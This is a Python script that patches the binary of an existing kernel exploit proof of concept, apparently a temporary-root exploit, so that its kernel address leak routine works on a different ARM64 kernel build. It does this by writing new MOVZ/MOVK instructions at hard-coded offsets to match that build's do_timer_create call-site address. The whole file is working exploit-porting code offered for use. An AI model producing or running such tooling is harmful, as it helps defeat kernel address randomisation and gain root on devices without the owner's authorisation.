#!/usr/bin/env python3
"""Retarget the original poc_tmp_root leak_slide() to PD2337 6.1.172.

The original function scans raw ftrace for a kmem call-site pointer whose low
21 bits are 0x1173e4 (XF6 do_timer_create+0xac).  For this kernel the link-time
do_timer_create is 0xffffffc0081a2524; the same call-site is +0xac.
"""
from __future__ import annotations
import struct, sys
from pathlib import Path
from elftools.elf.elffile import ELFFile

TARGET = 0xFFFFFFC0081A25D0
CONST = (-TARGET) & ((1 << 64) - 1)

def movz(rd, imm16, hw=0, sf=1):
    base = 0xD2800000 if sf else 0x52800000
    return base | ((hw & 3) << 21) | ((imm16 & 0xffff) << 5) | (rd & 31)

def movk(rd, imm16, hw=0, sf=1):
    base = 0xF2800000 if sf else 0x72800000
    return base | ((hw & 3) << 21) | ((imm16 & 0xffff) << 5) | (rd & 31)

def va_to_off(elf, va):
    for seg in elf.iter_segments():
        if seg['p_type'] == 'PT_LOAD' and seg['p_vaddr'] <= va < seg['p_vaddr'] + seg['p_filesz']:
            return seg['p_offset'] + va - seg['p_vaddr']
    raise SystemExit(f'VA not mapped: {va:#x}')

def main():
    if len(sys.argv) != 3:
        print('usage: make_poc_leak2.py <poc> <out>', file=sys.stderr)
        return 2
    src, dst = Path(sys.argv[1]), Path(sys.argv[2])
    data = bytearray(src.read_bytes())
    f = src.open('rb'); elf = ELFFile(f)
    def words(va, ws):
        o = va_to_off(elf, va)
        data[o:o+4*len(ws)] = b''.join(struct.pack('<I', w) for w in ws)
    # low21 marker: w27 = TARGET & 0x1fffff
    low = TARGET & 0x1fffff
    words(0x2458A4, [movz(27, low & 0xffff, 0, sf=0)])
    words(0x2458B8, [movk(27, (low >> 16) & 0xffff, 1, sf=0)])
    # x8 = -TARGET (64-bit)
    words(0x245A34, [movz(8, CONST & 0xffff, 0)])
    words(0x245A40, [movk(8, (CONST >> 16) & 0xffff, 1)])
    # high 16 bits of CONST are 0x003f; keep existing movk 0x3f,lsl32
    f.close(); dst.write_bytes(data)
    print(f'wrote {dst} bytes={len(data)} target={TARGET:#x} low21={low:#x} const={CONST:#x}')
    return 0
if __name__ == '__main__':
    raise SystemExit(main())
